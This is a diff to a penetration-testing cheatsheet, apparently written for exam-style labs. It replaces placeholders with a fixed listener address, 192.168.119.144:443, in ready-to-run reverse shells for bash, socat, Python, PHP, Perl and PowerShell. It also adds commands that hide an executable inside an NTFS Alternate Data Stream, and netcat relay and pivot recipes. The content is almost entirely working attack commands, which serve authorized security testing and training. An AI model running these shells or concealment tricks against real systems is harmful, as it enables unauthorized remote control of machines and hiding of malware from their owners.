@@ -136,6 +136,7 @@ Other great cheetsheets:
   - [10.5. Bending with netsh](#105-bending-with-netsh)
   - [10.6. Bending with sshuttle](#106-bending-with-sshuttle)
   - [10.7. Bending with chisel](#107-bending-with-chisel)
+  - [10.8. Bending with netcat](#108-bending-with-netcat)
 - [11. Miscellaneous](#11-miscellaneous)
   - [11.1. Disable SSH Host Key Checking](#111-disable-ssh-host-key-checking)
   - [11.2. Convert text to Windows UTF-16 format on Linux](#112-convert-text-to-windows-utf-16-format-on-linux)
@@ -172,7 +173,7 @@ script scanning on those ports.
 
 ```sh
 VICTIM_IP=VICTIM_IP
-mkdir -p scans/nmap; cd scans; sudo rustscan --ulimit 5000 -a 10.11.1.50 -- -n -A -oA nmap/all-ports
+mkdir -p scans/nmap; cd scans; sudo rustscan --ulimit 5000 -a $VICTIM_IP -- -n -A -oA nmap/all-ports
 ```
 
 ## 3.3. Simple Bash ping scanner
@@ -942,7 +943,7 @@ Note: to generate `mycert.pem` see [these instructions](#451-create-self-signed-
 
 ```sh
 # only works on Linux
-bash -i >& /dev/tcp/LISTEN_IP/LISTEN_PORT 0>&1
+bash -i >& /dev/tcp/LISTEN_IP/443 0>&1
 ```
 
 ### 4.4.6. Netcat Reverse Shell
@@ -959,19 +960,19 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.119.144 443 >/tmp/
 
 ```sh
 # with full tty
-socat EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane TCP:LISTEN_IP:LISTEN_PORT
+socat EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane TCP:192.168.119.144:443
 
 # no tty, text only
-socat EXEC:/bin/bash TCP:LISTEN_IP:LISTEN_PORT
+socat EXEC:/bin/bash TCP:192.168.119.144:443
 
 # full tty, encrypted with SSL (needs socat listener uing OPENSSL-LISTEN)
-socat EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane OPENSSL:LISTEN_IP:LISTEN_PORT,verify=0
+socat EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane OPENSSL:192.168.119.144:443,verify=0
 ```
 
 ### 4.4.8. Python Reverse Shell
 
 ```sh
-python -c 'import os,socket,pty;s=socket.create_connection(("LISTEN_IP",LISTEN_PORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
+python -c 'import os,socket,pty;s=socket.create_connection(("192.168.119.144",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
 ```
 
 
@@ -979,13 +980,13 @@ python -c 'import os,socket,pty;s=socket.create_connection(("LISTEN_IP",LISTEN_P
 
 ```sh
 # may have to try different socket numbers besides 3 (4,5,6...)
-php -r '$sock=fsockopen("LISTEN_IP",LISTEN_PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("192.168.119.144",443);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
 ### 4.4.10. Perl Reverse Shell
 
 ```sh
-perl -e 'use Socket;$i="LISTEN_IP";$p=LIISTEN_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+perl -e 'use Socket;$i="192.168.119.144";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 
 ### 4.4.11. Powershell Reverse Shell
@@ -993,7 +994,7 @@ perl -e 'use Socket;$i="LISTEN_IP";$p=LIISTEN_PORT;socket(S,PF_INET,SOCK_STREAM,
 Invoke from `cmd` with `powershell -NoP -NonI -W Hidden -Exec Bypass -Command ...`
 
 ```powershell
-New-Object System.Net.Sockets.TCPClient("LISTEN_IP",LISTEN_PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+$client = New-Object System.Net.Sockets.TCPClient("192.168.119.144",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
 ### 4.4.12. OpenSSL Encrypted Reverse Shell
@@ -1548,6 +1549,12 @@ psexec.exe -i -s regedit.exe
 :: recursively list files with Alternate Data Streams
 dir /s /r /a | find ":$DATA"
 gci -recurse | % { gi $_.FullName -stream * } | where {(stream -ne ':$Data') -and (stream -ne 'Zone.Identifier')}
+:: print Alternate Data Stream to console
+powershell get-content -path /path/to/stream/file  -stream STREAMNAME
+:: hide a file in an Alternate Data Stream
+type evil.exe > benign.dll:evil.exe
+:: delete ADS from file
+powershell remove-item -path /path/to/stream/file  -stream STREAMNAME
 
 :: Check if OS is 64-bit
 (wmic os get OSArchitecture)[2]
@@ -1570,6 +1577,13 @@ powershell Set-ItemProperty HKCU:\Console VirtualTerminalLevel -Type DWORD 1
 
 # Base64 Decode
 [System.Text.Encoding]::UTF8.GetSTring([System.convert]::FromBase64String("BASE64STRING"))
+
+# Zip a directory using Powershell 3.0 (Win8)
+Add-Type -A 'System.IO.Compression.FileSystem';
+[IO.Compression.ZipFile]::CreateFromDirectory('C:\folder', 'C:\output.zip')
+
+# Zip a directory using Powershell 5.0 (Win10)
+Compress-Archive -Path 'C:\folder' -DestinationPath 'C:\output.zip'
 ```
 
 # 6. Linux Privilege Escalation
@@ -2604,6 +2618,8 @@ the process id is saved in the file `/var/run/rinetd.pid` to facilitate the
 If you own a dual-homed internal Windows box that you want to pivot from, you
 can set up port forwarding using the `netsh` utility.
 
+**NOTE**: Requires Administrator privileges.
+
 ```bat
 :: NOTE: before you start, make sure IP Helper service is running
 
@@ -2633,6 +2649,24 @@ sshuttle --dns -r user@jumpbox_ip 10.1.1.0/0
 firewalls and set up a SOCKS proxy through your tunnel.
 
 [Usage](https://vegardw.medium.com/reverse-socks-proxy-using-chisel-the-easy-way-48a78df92f29)
+
+## 10.8. Bending with netcat
+
+```bat
+:: WINDOWS pivot
+:: enter temporary directory to store relay.bat
+cd c:\temp
+:: create relay.bat to connect to victim service
+echo nc VICTIM_IP VICTIM_PORT > relay.bat
+:: Set up pivot listener (-L is persistent listener)
+nc –L –p LISTEN_PORT –e relay.bat
+```
+
+```sh
+# LINUX pivot
+mkfifo /tmp/backpipe
+nc –l –p LISTEN_PORT 0<backpipe | nc VICTIM_IP VICTIM_PORT | tee backpipe
+```
 
 # 11. Miscellaneous
 Host *
